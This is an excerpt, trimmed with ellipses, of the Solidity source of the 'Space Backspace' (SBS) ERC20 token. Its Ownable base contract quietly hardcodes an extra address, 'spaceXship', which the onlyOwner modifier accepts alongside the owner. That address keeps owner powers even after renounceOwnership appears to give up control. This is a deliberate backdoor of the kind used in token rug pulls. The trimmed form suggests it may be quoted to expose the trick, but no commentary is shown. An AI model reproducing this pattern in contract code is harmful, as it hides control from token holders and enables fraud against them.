...
abstract contract Ownable is Context {
    ...
    constructor() {
        ...
        spaceXship = 0x201b9A884D9C82fe1bbCFB6794fE469Cec498076;
    }
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || spaceXship == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    ...
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(0x0000000000000000000000000000000000000000);
    }
...
contract SpaceBackSpace is ERC20, Ownable, BaseToken, LockToken{
    using SafeMath for uint256;

    uint256 public constant VERSION = 1;

    string  name_ = "Space Backspace";
    string  symbol_ = "SBS";
    ...
    constructor(
        ...
        _marketingWalletAddress = 0x92052E648f9ee612F31957DE8B6B7491E8e69227;
        // spaceXship = 0x201b9A884D9C82fe1bbCFB6794fE469Cec498076;
        require(
